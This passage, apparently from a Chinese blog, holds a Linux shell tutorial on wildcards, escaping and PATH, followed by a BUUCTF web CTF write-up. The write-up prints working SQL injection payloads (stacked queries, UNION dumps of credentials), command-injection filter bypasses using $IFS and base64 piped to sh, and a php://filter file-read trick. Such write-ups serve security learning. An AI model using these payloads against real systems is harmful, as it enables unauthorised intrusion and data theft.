Linux系统中的通配符及含义</p><table><thead><tr><th>通配符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>任意字符</td></tr><tr><td>?</td><td>单个任意字符</td></tr><tr><td>[a-z]</td><td>单个小写字母</td></tr><tr><td>[A-Z]</td><td>单个大写字母</td></tr><tr><td>[a-Z]</td><td>单个字母</td></tr><tr><td>[0-9]</td><td>单个数字</td></tr><tr><td>[[:alpha:]]</td><td>任意字母</td></tr><tr><td>[[:upper:]]</td><td>任意大写字母</td></tr><tr><td>[[:lower:]]</td><td>任意小写字母</td></tr><tr><td>[[:digit:]]</td><td>所有数字</td></tr><tr><td>[[:alnum:]]</td><td>任意字母加数字</td></tr><tr><td>[[:punct:]]</td><td>标点符号</td></tr></tbody></table><p>匹配所有在&#x2F;dev目录中且以sda开头的文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211721688.png" alt="image-20220321172103645"></p><p>如果只是想查看文件名以sda开头,但是后面还仅跟着其他某一个字符的文件的相关信息,这时就需要用到问号来进行统配了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211723768.png" alt="image-20220321172316728"></p><p>除了使用[0-9]来匹配0-9之间的单个数字,也可以使用[125]这样的方式仅匹配3个指定数字中的一个;若没有匹配出来就不会显现出来</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211725294.png" alt="image-20220321172516258"></p><p>通配符不一定非要放到最后,也可以放到前面,比如可以使用以下的命令来搜索&#x2F;etc&#x2F;目录中所有以.config为结尾的配置文件有哪些</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211726835.png" alt="image-20220321172641793"></p><p>通配符不仅可以用于搜索文件或者代替通配符的字符,还可以与创建文件命令相结合,一口气创建出多个文件.不过在创建文件的时候,需要使用大括号,并且字段之间用逗号隔开</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211729694.png" alt="image-20220321172901655"></p><p>通配符还可以输出指定的信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211729022.png" alt="image-20220321172958974"></p><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><p>常用的转义字符</p><ul><li>反斜杠(\) :使反斜杠后面的一个变量变为单纯的字符</li><li>单引号(‘’):转义其中所有的变量为单纯的字符串</li><li>双引号(“”):保留其中的变量属性,不进行转义处理</li><li>反引号(&#96;&#96;):把其中的命令执行后返回结果</li></ul><p>我们先定义一个名为PRICE的变量并赋值为5,然后输出以双引号括起来的字符串与变量信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221809595.png" alt="image-20220322180856525"></p><p>我们接下来希望能输出”Price is $5”,即”价格是5美元”的字符串内容,但碰巧美元符号与变量提取符号合并之后的$$作用是显示当前程序的进程ID号码,于是命令执行后的输出的内容弄并不是我们所预期的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221813762.png" alt="image-20220322181355715"></p><p>想要第一个$称为美元复发,那么需要使用反斜杠(\)来进行转义,将这个命令提取符转义成单纯的文本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221815759.png" alt="image-20220322181515717"></p><p>而如果只需要某个命令的输出值,可以像&#96;&#96;命令一样,将命令用反引号括起来,达到预期的效果.例如,将反引号与uname -a命令结合,然后使用echo命令来查看本机的linux版本和内核信息.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221817665.png" alt="image-20220322181724621"></p><p>反斜杠胡反引号的功能比较有特点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221820011.png" alt="image-20220322182000968"></p><p>两者的区别在与用户无法得知第一种执行方式中到底有几个参数,因为有可能把”AA BB CC”当成一个参数整体输出到屏幕上,也有可能将AA BB CC分别输出到屏幕上</p><p>如果参数中出现了空格,就加上单引号,如果参数中没有空格,那么就不用加双引号</p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>变量是计算机系统用于保存可变值的数据类型,在linux系统中,变量名称一般都是大写的,命令则都是小写的,这是一种规范.linux中的环境变量是用来定义系统运行环境的一些参数,比如每个用户不同的家目录,邮件存在的位置等.可以直接通过变量的名称来提取对应的变量值.</p><p>linux中命令在执行时分为四个步骤</p><ol><li><p>判断用户是否以绝对路径或相对路径的方式输入命令(如&#x2F;bin&#x2F;ls),如果是绝对路径则直接执行,否则进入第二步继续判断</p></li><li><p>linux系统检查用户输入的命令是否为”别名命令”,即一个自定义的命令名称来提换原本的命令名称之前在使用rm命令删除文件时,linux系统都会要求用户确认是否执行删除操作,其实这就是linux系统为了防止用户误删除文件而特意设置的rm别名命令 “rm -i”<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221830123.png" alt="image-20220322183042074">可以使用alias命令来创建一个属于自己的命令别名,语法格式为”alias别名&#x3D;命令” 若要取消一个命令的别名,则是用unalias命令,语法</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unalias 别名</span><br></pre></td></tr></table></figure></li><li><p>Bash解释器判断用户输入的是内部命令还是外部命令.内部命令时解释器内部的指令,会被直接执行;而用户在绝大部分时间输入的是外部命令,这些命令交由步骤4继续处理.可以使用”type命令名称”来判断用户输入的命令时内部命令还是外部命令<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221836524.png" alt="image-20220322183641480"></p></li><li><p>系统在多个路径中查找用户输入的命令文件,而定义这些路径的变量叫做PATH,可以简单的把他理解成是”解释器的小助手”.所用是告诉Bash解释器待执行的命令可能存放的位置,然后bash解释器就会乖乖的在这些位置直接查找.PATH是由多个路径值组成的变量,每个路径之间用冒号间隔,对这些路径的增加或者删除操作都将影响到bash解释器对linux命令的查找</p></li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241309080.png" alt="image-20220322184106239"></p><p>为什么不能将当前目录(.)添加到PATH中呢?原因是黑客在比较常用的公共目录&#x2F;tmp中存放了一个与ls或者cd命令同名的木马文件,只要在这里执行了就会中招</p><p>在接手一台linux系统之后一定会在执行命令前先检查PATH变量中是否有可疑的目录,我们可以使用env命令来查看linux系统中所有的环境变量</p><p> Linux系统中最重要的10个环境变量</p><table><thead><tr><th>变量名称</th><th>作用</th></tr></thead><tbody><tr><td>HOME</td><td>用户的主目录（即家目录）</td></tr><tr><td>SHELL</td><td>用户在使用的Shell解释器名称</td></tr><tr><td>HISTSIZE</td><td>输出的历史命令记录条数</td></tr><tr><td>HISTFILESIZE</td><td>保存的历史命令记录条数</td></tr><tr><td>MAIL</td><td>邮件保存路径</td></tr><tr><td>LANG</td><td>系统语言、语系名称</td></tr><tr><td>RANDOM</td><td>生成一个随机数字</td></tr><tr><td>PS1</td><td>Bash解释器的提示符</td></tr><tr><td>PATH</td><td>定义解释器搜索用户执行命令的路径</td></tr><tr><td>EDITOR</td><td>用户默认的文本编辑器</td></tr></tbody></table><p>linux作为一个多用户 多任务的操作系统,能够为每个用户提供独立的 合适的工作运行环境,因此一个相同的变量会因为用户身份的不同而具有不同的值.例如使用下述命令来查看HOME变量在不同的用户身份下都有哪些值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221847704.png" alt="image-20220322184749657"></p><p>直接在终端设置的变量能够立即生效,但是重启服务器之后就会立即失效,因此我们需要将变量和变量值写入到.bashrc或者.bash_profile中,以确保永久能使用他们.</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF的web(一)</title>
      <link href="/BUUCTF/BUUCTF/BUUCTF-web(%E4%B8%80)/"/>
      <url>/BUUCTF/BUUCTF/BUUCTF-web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="堆叠注入-绕过-限制"><a href="#堆叠注入-绕过-限制" class="headerlink" title="堆叠注入,绕过||限制"></a>堆叠注入,绕过||限制</h1><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL">BUUCTF的suctf2019,EasySQL</a></p><p>闭合测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108310.png" alt="image-20220322110813199"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108116.png" alt="image-20220322110824045"></p><p>这里输入’没有回显也没有报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221108356.png" alt="image-20220322110852300"></p><p>这里发现有过滤,本来想fuzz的发现平台靶机不让扫手工测试吧</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221109941.png" alt="image-20220322110946880"></p><p>发现过滤了union,那么联合注入肯定就不行了.</p><p>尝试一下堆叠注入,发现回显了数据库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221111781.png" alt="image-20220322111100711"></p><p>接着查一下表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221111362.png" alt="image-20220322111124297"></p><p>但是查字段的时候发现了问题,这里发现from 和 flag 都被过滤了,这怎么注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221112015.png" alt="image-20220322111226954"></p><p>这块需要我们对后端的语句进行猜测,通过输入非零数字得到回显和输入其他字符得不到回显来判断出内部的查询语句可能存在有|| ,也就是select 输入的数据|| 内置一个列名 from 表名,进一步猜测即为select post 进去的数据 || flag from flag (含有数据的表名,通过堆叠注入可知),需要注意的是,此时的|| 起到的作用是or 的作用</p><p><strong>方法一</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入的内容为 *,1 </span><br><span class="line">内置的sql语句为sql = &quot;select&quot;.sql = &quot;select&quot;.post[&#x27;query&#x27;].&quot;||flag from flag&quot;;</span><br><span class="line">那么最终语句就是 &quot;select *,1 || flag from flag&quot;也就是select *,1 from flag;也就直接查出来flag表中的所有数据</span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入内容为1; set sql_mode=pipes_as_concat;select 1</span><br><span class="line">其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</span><br></pre></td></tr></table></figure><p>查询当前数据库的sql_mode</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221227328.png" alt="image-20220322122725261"></p><p> 这个sql_mode下使用||异或运算符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0 || flag from flag;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221227813.png" alt="image-20220322122742757"></p><p>当设置sql_mode为PIPES_AS_CONCAT时，将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sql_mode=PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221228710.png" alt="image-20220322122824640"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 || flag from flag;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221228397.png" alt="image-20220322122844336"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select&quot;.sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</span><br><span class="line">query=3;set sql_mode=PIPES_AS_CONCAT;select 3</span><br></pre></td></tr></table></figure><p><strong><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221230905.png" alt="image-20220322123021799"></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加几种常见的sql_mode值的介绍：</span><br><span class="line"></span><br><span class="line">几种常见的mode介绍</span><br><span class="line">ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。</span><br><span class="line"></span><br><span class="line">NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。</span><br><span class="line"></span><br><span class="line">STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。</span><br><span class="line"></span><br><span class="line">NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。</span><br><span class="line"></span><br><span class="line">ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL</span><br><span class="line"></span><br><span class="line">NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户</span><br><span class="line"></span><br><span class="line">NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</span><br><span class="line"></span><br><span class="line">PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</span><br><span class="line"></span><br><span class="line">ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</span><br></pre></td></tr></table></figure><h1 id="无注释闭合sql注入"><a href="#无注释闭合sql注入" class="headerlink" title="无注释闭合sql注入"></a>无注释闭合sql注入</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">BUUCTF[极客大挑战 2019]LoveSQL</a></p><p>打开发现是登录框,直接抓一下数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221446574.png" alt="image-20220322144646473"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221447768.png" alt="image-20220322144741735"></p><p>发现是像check.php发送请求了,测试下闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=1&#x27;&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221448755.png" alt="image-20220322144822714"></p><p>单引号闭合,无括号</p><p>万能密码登录一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221456107.png" alt="image-20220322145600027"></p><p>这个解密不出来</p><p>查字段数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221456030.png" alt="image-20220322145657980"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221457088.png" alt="image-20220322145709022"></p><p>那么就是三个了,在2这里有回显,这里需要注意这里的1并不是字段1的值而是永真条件的1这里是不能利用的.也可以这么闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure><p>接着查数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=1&#x27; union select 1,database(),&#x27;3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221459115.png" alt="image-20220322145913037"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221505419.png" alt="image-20220322150501363"></p><p>查字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;),&#x27;3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221506513.png" alt="image-20220322150638446"></p><p>得数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin&amp;password=1&#x27; union select 1,(select group_concat(username,password) from l0ve1ysq1),&#x27;3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221507016.png" alt="image-20220322150738985"></p><h1 id="命令执行之进程监控绕过"><a href="#命令执行之进程监控绕过" class="headerlink" title="命令执行之进程监控绕过"></a>命令执行之进程监控绕过</h1><p>使用 | 来绕过并使用写入文件的方法二次返回查看结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123|ls ../../../&gt;test</span><br></pre></td></tr></table></figure><p>查找flag文件的存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221244378.png" alt="image-20220322124456330"></p><p>找到之后在通过网页直接访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:16803/test</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221245726.png" alt="image-20220322124512696"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221245437.png" alt="image-20220322124531390"></p><p>下载下来一个文件</p><p>同理查看flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123|cat /flag&gt;test1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246749.png" alt="image-20220322124607710"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246475.png" alt="image-20220322124618442"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221246518.png" alt="image-20220322124630488"></p><h1 id="linux-空格过滤绕过"><a href="#linux-空格过滤绕过" class="headerlink" title="linux 空格过滤绕过"></a>linux 空格过滤绕过</h1><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping">BUUCTF[GXYCTF2019]Ping Ping Ping</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221332343.png" alt="image-20220322133232247"></p><p>发现提示ip,那么添加上发现是一个命令执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221335633.png" alt="image-20220322133559594"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1||ls</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221336870.png" alt="image-20220322133615843"></p><p>发现flag.php与index.php那么现在就是读取文件了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1||cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221337339.png" alt="image-20220322133758302"></p><p>发现过滤了空格,想办法绕过空格，大题有以下思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.php</span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br><span class="line">cat$IFS$9flag.php</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt$1</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>有时 cat 可能被过滤，那么尝试用 tac，反向输出；或者 linux命令中可以加 \，所以甚至可以 ca\t &#x2F;fl\ag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1||cat$IFSflag.php</span><br></pre></td></tr></table></figure><p>发现flag也被过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221340128.png" alt="image-20220322134002100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里尝试了一下只有?ip=1||cat$IFS$1index.php可用</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];<span class="comment">/*</span></span><br><span class="line"><span class="comment">/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/</span></span><br><span class="line"><span class="comment">表示匹配&amp;/?*&lt;匹配\x00-\x1f之间的&gt;&#x27;&quot;\()[]&#123;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;<span class="comment">#不能匹配空格</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;<span class="comment">#不能匹配bash</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line"><span class="comment">//        /.*f.*l.*a.*g.*/</span></span><br><span class="line"><span class="comment">//        .表示匹配任何字符不包括换行符</span></span><br><span class="line"><span class="comment">//        *表示匹配0个或者更多个前面的标记flag</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);<span class="comment">#通过shell环境执行命令并通过字符串形式进行返回</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>拼接</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=1||a=g;cat$IFS$1fla$a.php</span><br><span class="line">?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</span><br></pre></td></tr></table></figure><p><strong>sh</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>这里先对cat flag.php进行base64加密,既然过滤了bash,那就使用sh.sh也是Linux中的shell命令，bash是sh的升级版，在此题我们也可以利用sh，先将flag.php base64编码绕过过滤，后再通过sh命令将其解码即可</p><p><strong>内联注释</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><p>反引号里面的命令的输出作为执行</p><h1 id="php伪协议使用"><a href="#php伪协议使用" class="headerlink" title="php伪协议使用"></a>php伪协议使用</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File">BUUCTF[极客大挑战 2019]Secret File</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221304932.png" alt="image-20220322130428887"></p><p>看一下源代码,发现有一个连接打开看看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221304097.png" alt="image-20220322130444070"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221305894.png" alt="image-20220322130513854"></p><p>一点就跳过去了,抓包看一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221305022.png" alt="image-20220322130519983"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221306398.png" alt="image-20220322130650358"></p><p>发现文件,访问一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221307996.png" alt="image-20220322130708952"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">#这里就是不能匹配到这几个</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里就很简单了直接php伪协议得一下源码就好</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221308597.png" alt="image-20220322130815564"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221308773.png" alt="image-20220322130824732"></p><h1 id="简单webshell连接"><a href="#简单webshell连接" class="headerlink" title="简单webshell连接"></a>简单webshell连接</h1><p><a href="https://buuoj.cn/challenges#Knife">BUUCTF极客大挑战 2019Knife</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221510873.png" alt="image-20220322151015834"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221509400.png" alt="image-20220322150924356"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221511815.png" alt="image-20220322151126779"></p><h1 id="添加http请求头"><a href="#添加http请求头" class="headerlink" title="添加http请求头"></a>添加http请求头</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http">BUUCTF[极客大挑战 2019]Http</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221514137.png" alt="image-20220322151442084"></p><p>打广告,过分页面上啥也没有,那么接下来就是扫目录或者看源码了,这里翻源码看到一个奇怪的页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221518352.png" alt="image-20220322151822325"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221518863.png" alt="image-20220322151858825"></p><p>接下来加个Referer头就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221521741.png" alt="image-20220322152139712"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221522399.png"></p><p>改一下浏览器</p><p><img 